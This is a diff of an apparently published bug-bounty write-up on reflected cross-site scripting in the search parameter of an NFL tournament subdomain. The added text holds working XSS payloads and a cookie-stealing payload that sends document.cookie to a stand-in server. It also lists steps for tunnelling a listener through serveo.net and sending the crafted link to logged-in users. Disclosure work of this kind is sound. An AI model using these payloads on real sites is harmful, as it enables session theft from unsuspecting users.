@@ -16,31 +16,38 @@ layout: default
 
   <div class="bounty-content">
     <h2>🎯 Vulnerability Summary</h2>
-    <p>The NFL's main search functionality was found to be vulnerable to Reflected Cross-Site Scripting (XSS). The vulnerability resided in how the application handled and reflected the search query parameter back into the page without proper output encoding.</p>
+    <p>We identified a Reflected Cross-Site Scripting (XSS) vulnerability on the public-facing domain <code>hbcutournament.nfl.com</code>. The vulnerability resides in the search results page URL fragment (<code>?q=</code>) parameter, which improperly processes user-supplied input without adequate sanitization.</p>
 
-    <h2>⚙️ Technical Details</h2>
-    <ul>
-      <li><strong>Affected URL:</strong> <code>https://www.nfl.com/search/?query=[XSS_PAYLOAD]</code></li>
-      <li><strong>Affected Parameter:</strong> <code>query</code></li>
-      <li><strong>Vector:</strong> Client-side injection of malicious scripts via URL.</li>
-    </ul>
+    <h2>⚙️ Affected URLs</h2>
+    <pre><code>https://hbcutournament.nfl.com/resources?q=
+https://hbcutournament.nfl.com/blogs?q=</code></pre>
 
-    <h2>🛠️ Steps to Reproduce</h2>
-    <p>By injecting a standard script tag into the <code>query</code> parameter, we confirmed that the input was reflected directly into the Document Object Model (DOM):</p>
+    <h2>🛠️ Proof of Concept Payloads</h2>
     
-    <pre><code>"><script>alert(document.domain)</script></code></pre>
-    
-    <img src="../../../assets/images/nfl-xss-search-query/PayloadExecution.png" alt="XSS Payload Execution">
+    <h3>HTML Injection</h3>
+    <p>The first thing we tried in the search field was a simple HTML injection:</p>
+    <pre><code>&lt;h1&gt;This is a HTML Injection test&lt;/h1&gt; --- This is a normal text.</code></pre>
+    <img src="../../../assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - HTML Injection.png" alt="HTML Injection">
 
-    <p>The application failed to sanitize the input, allowing the script to execute in the context of the victim's browser. This could be leveraged to steal sensitive session information or perform actions on behalf of the user.</p>
+    <h3>Reflected XSS</h3>
+    <p>After testing several payloads, we discovered that the <code>&lt;img&gt;</code> tag works:</p>
+    <pre><code>&lt;img/src/onerror=alert(8)&gt;</code></pre>
+    <img src="../../../assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - Alert 1.png" alt="Alert Proof">
 
-    <h2>⚠️ Security Impact</h2>
-    <p>An attacker could craft a malicious link and send it to an authenticated user. Once clicked, the attacker could:</p>
-    <ul>
-      <li>Exfiltrate session cookies and bypass authentication.</li>
-      <li>Perform unauthorized actions (CSRF-like impact via XSS).</li>
-      <li>Deface the website content for specific users.</li>
-    </ul>
+    <h3>Reflected XSS with Cookies exfiltration</h3>
+    <p>After verifying that we could execute JavaScript code, we attempted to exfiltrate cookies to steal session data.</p>
+    <pre><code>&lt;img/src/onerror=fetch("http://YOUR-WEB-SERVER/"+encodeURIComponent(document.cookie))&gt;</code></pre>
+    <img src="../../../assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - Cookies Exfiltration.png" alt="Cookies Exfiltration Payload">
+    <img src="../../../assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - Cookies Exfiltration Result.png" alt="Exfiltration Result">
+
+    <h2>🚀 Steps to Reproduce</h2>
+    <ol>
+      <li>Start a local Web Server: <code>python3 -m http.server 8000</code></li>
+      <li>Expose it publicly (e.g., using Serveo): <code>ssh -R 80:localhost:8000 serveo.net</code></li>
+      <li>Prepare the malicious URL with your server address.</li>
+      <li>Share the URL with an authenticated user.</li>
+      <li>Receive victim cookies in your side.</li>
+    </ol>
 
     <h2>🤝 Collaboration Details</h2>
     <p>This research was conducted in a joint effort with the following researchers:</p>
@@ -56,7 +63,7 @@ layout: default
       </div>
       <div class="glass-card">
         <small>Severity</small>
-        <strong>P3 (Medium)</strong>
+        <strong>High (reported as P3)</strong>
       </div>
     </div>
   </div>
